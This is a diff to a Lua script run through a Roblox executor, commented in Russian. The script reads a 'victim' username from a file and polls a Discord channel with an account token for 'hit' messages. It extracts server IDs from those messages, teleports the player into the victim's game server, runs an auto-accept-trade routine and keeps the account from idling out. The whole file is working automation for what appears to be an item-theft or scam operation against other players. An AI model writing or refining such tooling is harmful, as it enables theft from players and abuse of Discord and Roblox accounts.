@@ -5,7 +5,7 @@ end
 
 -- Проверка токена и ID канала
 if token == "" or channelId == "" then
-    game.Players.LocalPlayer:Kick("❌ Добавь токен и channelId в скрипт!")
+    game.Players.LocalPlayer:Kick("❌ Введи токен и channelId!")
     return
 end
 
@@ -13,10 +13,7 @@ end
 local VirtualUser = game:GetService('VirtualUser')
 game:GetService('Players').LocalPlayer.Idled:Connect(function()
     VirtualUser:CaptureController()
-    VirtualInputManager:SendMouseButtonEvent(0,0,0,true,game,0)
-    task.wait(0.1)
-    VirtualInputManager:SendMouseButtonEvent(0,0,0,false,game,0)
-    print("🔄 Anti-AFK активирован")
+    VirtualUser:ClickButton2(Vector2.new())
 end)
 
 -- Настройки файлов
@@ -28,27 +25,18 @@ local victimUser = readfile("user.txt")
 local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
 local isTeleporting = false
 
--- Улучшенный парсинг команды телепортации
+-- Ультра-надёжный парсер
 local function findTeleportCommand(content)
     if not content then return nil, nil end
     
-    -- Универсальный поиск (игнорирует лишние пробелы и кавычки)
-    local patterns = {
-        'TeleportService%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
-        'game:GetService%s*%("TeleportService"%)%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
-    }
+    -- Универсальный паттерн для любых вариантов
+    local pattern = '[gG]ame%s*[:%.]%s*[gG]et[Ss]ervice%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*[tT]eleport[tT]o[pP]lace[iI]nstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
     
-    for _, pattern in ipairs(patterns) do
-        local placeId, jobId = content:match(pattern)
-        if placeId and jobId then
-            return placeId, jobId
-        end
-    end
-    
-    return nil, nil
+    local placeId, jobId = content:match(pattern)
+    return placeId, jobId
 end
 
--- Основная функция проверки Discord
+-- Основная функция
 local function checkDiscord()
     local response = request({
         Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
@@ -60,43 +48,37 @@ local function checkDiscord()
     })
 
     if not response.Success then
-        warn("❌ Ошибка Discord API: "..tostring(response.StatusCode))
+        warn("❌ Ошибка Discord:", response.StatusCode)
         return
     end
 
     local messages = HttpService:JSONDecode(response.Body)
     for _, msg in ipairs(messages) do
-        if msg.content and msg.content:find("TeleportService") then
-            print("\n🔍 Найдено сообщение с хитом! ID:", msg.id)
-            print("📄 Content:", string.sub(msg.content, 1, 100).."...") -- Выводим часть контента
+        if msg.content then
+            print("🔍 Проверяем сообщение:", string.sub(msg.content, 1, 50).."...")
             
             local placeId, jobId = findTeleportCommand(msg.content)
             if placeId and jobId then
-                print("🎯 Найдена команда телепортации:")
-                print("   PlaceID:", placeId)
-                print("   JobID:", jobId)
+                print("🎯 Найдены ID:", placeId, jobId)
                 
                 if not table.find(joinedIds, msg.id) then
                     table.insert(joinedIds, msg.id)
                     writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
                     
-                    print("🚀 Телепортация на сервер...")
+                    print("🚀 Телепортируемся...")
                     isTeleporting = true
-                    local success, err = pcall(function()
+                    local success = pcall(function()
                         game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId)
                     end)
                     
                     if not success then
-                        warn("❌ Ошибка телепортации:", err)
                         isTeleporting = false
+                        warn("❌ Ошибка телепортации")
                     end
                     return
                 else
-                    print("⚠️ Уже присоединялись к этому хиту")
+                    print("⚠️ Уже были на этом сервере")
                 end
-            else
-                print("❌ Не найдена команда телепортации в content!")
-                print("Проверь паттерны поиска в функции findTeleportCommand")
             end
         end
     end
@@ -115,11 +97,9 @@ end
 -- Запуск
 task.spawn(autoAcceptTrade)
 
-print("✨ Скрипт запущен! Ожидание новых хитов...")
+print("✨ Скрипт запущен!")
 while task.wait(5) do
     if not isTeleporting then
         pcall(checkDiscord)
-    else
-        print("🔄 Ожидание завершения телепортации...")
     end
 end
